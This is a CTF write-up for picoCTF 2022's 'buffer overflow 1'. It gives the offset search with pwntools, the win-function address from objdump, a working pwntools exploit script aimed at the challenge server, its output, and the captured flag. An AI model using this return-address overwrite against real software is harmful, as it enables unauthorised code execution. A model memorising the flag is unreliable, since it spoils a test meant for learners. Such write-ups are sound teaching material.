# buffer overflow 1

## Objetivo

Control the return address
Additional details will be available after launching your challenge instance.

## Solución

```python
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

```bash
hone@unidad03:~/buffer_overflow_1$ ./vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
```

```python
>>> cyclic_find(0x6161616c)
44
```

```bash
>>> 'x'*44
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
```

```bash
hone@unidad03:~/buffer_overflow_1$ objdump -D vuln -M intel | grep 'win'
080491f6 <win>:
 804922c:	75 2a                	jne    8049258 <win+0x62>
```

```python
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
```

Se crea al siguiente codigo en python

```python
from pwn import *

p = remote('saturn.picoctf.net',51855)

cadena = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\xf6\x91\x04\x08'

p.sendline(cadena)

p.interactive()
```

Despues se pone en funcionamiento.

```bash
hone@unidad03:~/buffer_overflow_1$ python3 expo.py 
[+] Opening connection to saturn.picoctf.net on port 51855: Done
/home/hone/Documentos/Materias/Seguridad_Redes_Sistemas/problemas-hacking/picoCTF/binary_explotation/2022/buffer_overflow_1/expo.py:7: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(cadena)
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}[*] Got EOF while reading in interactive
$ 
```

Bandera: *picoCTF{addr3ss3s_ar3_3asy_9cf083f8}*

## Referencias
